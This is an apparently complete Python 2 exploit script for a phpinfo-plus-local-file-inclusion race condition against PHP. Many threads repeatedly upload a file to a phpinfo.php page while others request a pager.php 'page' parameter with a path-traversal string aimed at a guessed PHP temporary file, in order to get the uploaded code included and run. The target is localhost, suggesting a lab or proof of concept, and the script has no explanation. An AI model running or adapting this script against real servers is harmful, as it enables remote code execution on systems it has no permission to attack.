import requests
import threading
phpinfo_url = 'http://localhost/web/phpinfo.php'
lfi_url = 'http://localhost/web/pager.php?page='

target_file = '../../../../../../../../../tmp/phpb6hJ7Y'

call_url = lfi_url + target_file

c = 0

class ExploitThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        global c
        while True:
            files = {'file': open('poc.txt', 'r')}
            r = requests.post(phpinfo_url, files=files)
            c = c + 1
            print c

class Exploit2Thread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        global c
        while True:
            p = requests.get(call_url)
            c = c + 1
            print c
wc = 25
for i in range(0,wc):
    th = ExploitThread()
    th2 = Exploit2Thread()
    th.start()
    th2.start()

print raw_input('now')
